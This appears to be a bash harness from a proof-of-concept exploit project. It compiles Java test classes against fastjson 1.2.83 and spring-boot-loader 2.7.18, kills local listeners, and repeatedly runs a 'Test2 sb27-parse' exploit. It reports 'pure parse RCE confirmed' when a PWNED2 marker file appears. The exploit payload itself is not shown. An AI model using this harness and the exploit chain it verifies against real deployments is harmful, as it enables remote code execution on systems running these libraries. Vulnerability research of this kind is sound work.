#!/usr/bin/env bash
set -euo pipefail
root_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${root_dir}"
# shellcheck disable=SC1091
source scripts/common.sh

java_bin="${JAVA:-java}"
javac_bin="${JAVAC:-javac}"
retries="${POC_RETRIES:-3}"
# avoid inherited noisy tool options
unset JAVA_TOOL_OPTIONS || true

echo "[verify] java = $(${java_bin} -version 2>&1 | head -1)"
spec="$(${java_bin} -XshowSettings:property -version 2>&1 | awk -F'= ' '/java.specification.version/ {print $2; exit}' | tr -d '[:space:]')"
echo "[verify] java.specification.version=${spec:-unknown}"

if [[ ! -f lib/fastjson-1.2.83.jar || ! -f lib/spring-boot-loader-2.7.18.jar || ! -f lib/asm-9.6.jar ]]; then
  bash scripts/build-harness.sh
else
  mkdir -p target/classes
  if ${javac_bin} --help 2>&1 | grep -q -- "--release"; then
    ${javac_bin} --release 8 -encoding UTF-8 -cp "lib/*" -d target/classes src/main/java/*.java
  else
    ${javac_bin} -source 8 -target 8 -encoding UTF-8 -cp "lib/*" -d target/classes src/main/java/*.java
  fi
fi

python3 - <<'PY'
import os, signal, subprocess
for p in range(18080, 18086):
    try:
        out = subprocess.check_output(["lsof", "-ti", f"tcp:{p}", "-sTCP:LISTEN"], text=True).strip()
    except Exception:
        continue
    for pid in out.split():
        try:
            os.kill(int(pid), signal.SIGTERM)
            print(f"[verify] freed stale listener pid={pid} port={p}")
        except Exception:
            pass
PY
sleep 0.2

ok=0
for i in $(seq 1 "${retries}"); do
  python3 -c "from pathlib import Path; Path('PWNED2').unlink(missing_ok=True)"
  echo "[verify] attempt ${i}/${retries}: Test2 sb27-parse (hostToken=${POC_HOST_TOKEN:-localhost})"
  set +e
  "${java_bin}" "${POC_JAVA_OPTS[@]}" \
    -Dpoc.hostToken="${POC_HOST_TOKEN:-localhost}" \
    -cp "target/classes:lib/fastjson-1.2.83.jar:lib/spring-boot-loader-2.7.18.jar:lib/asm-9.6.jar" \
    Test2 sb27-parse
  ec=$?
  set -e
  if [[ $ec -eq 0 && -f PWNED2 ]]; then
    echo "[verify] SUCCESS on attempt ${i}: pure parse RCE confirmed (PWNED2 exists)"
    ok=1
    break
  fi
  echo "[verify] attempt ${i} failed (exit=${ec})"
  sleep 0.3
done

if [[ $ok -eq 1 ]]; then
  exit 0
fi
if [[ "${spec}" != "1.8" && "${spec}" != "8" ]]; then
  echo "[verify] full RCE requires JDK 8; current=${spec:-unknown}"
  exit 4
fi
echo "[verify] FAIL after ${retries} attempts"
echo "[verify] tips: JDK8 + disable system proxy + hostToken=localhost"
exit 1
